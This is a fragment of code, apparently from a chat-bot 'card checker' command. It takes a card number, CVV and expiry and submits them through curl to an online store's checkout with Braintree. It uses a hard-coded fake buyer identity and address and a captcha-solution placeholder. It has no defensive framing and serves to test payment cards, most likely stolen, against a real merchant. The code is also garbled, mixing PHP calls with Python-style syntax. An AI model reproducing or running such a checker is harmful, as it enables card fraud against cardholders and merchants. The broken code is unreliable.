                    ...
                    if (preg_match('/^(\/bv|\.bv|!bv)/', text)) :
                        ...
                        c4 = substr(cc, -4)
                            ...
                            if (empty(cc) || empty(cvv) || empty(mes) || empty(ano)) :
                                ...
                                curl_setopt(ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt')
                                curl_setopt(ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt')
                                curl_setopt(ch, CURLOPT_POSTFIELDS, '{"addressInformation":{"shipping_address":{"countryId":"US","regionId":"36","regionCode":"MO","region":"Missouri","street":["8700 NW River Park Dr"],"company":"","telephone":"4254353455","postcode":"64152-4358","city":"Parkville","firstname":"Jack","lastname":"Coddrey"},"billing_address":{"countryId":"US","regionId":"36","regionCode":"MO","region":"Missouri","street":["8700 NW River Park Dr"],"company":"","telephone":"4254353455","postcode":"64152-4358","city":"Parkville","firstname":"Jack","lastname":"Coddrey","saveInAddressBook":None},"shipping_method_code":"Flat_Rate","shipping_carrier_code":"shqcustom","extension_attributes":{}}}')
                                curl5 = curl_exec(ch)
                                print "CURL5 - (curl5)"
                                ...
                                curl_setopt(ch, CURLOPT_HEADER, 0)
                                curl_setopt(ch, CURLOPT_RETURNTRANSFER, 1)
                                curl_setopt(ch, CURLOPT_POSTFIELDS, '{"cartId":"'.EID.'","billingAddress":{"countryId":"US","regionId":"36","regionCode":"MO","region":"Missouri","street":["8700 NW River Park Dr"],"company":"","telephone":"4254353455","postcode":"64152-4358","city":"Parkville","firstname":"Jack","lastname":"Coddrey","saveInAddressBook":None},"paymentMethod":{"method":"braintree","additional_data":{"payment_method_nonce":"'.pid.'","g-recaptcha-response":"<SOL>","device_data":"{\"correlation_id\":\"6b8920809f0cdd54f325801a17f79828\"}"},"extension_attributes":{"agreement_ids":["1"]}},"email":"'.email.'"}')
                                curl8 = curl_exec(ch)
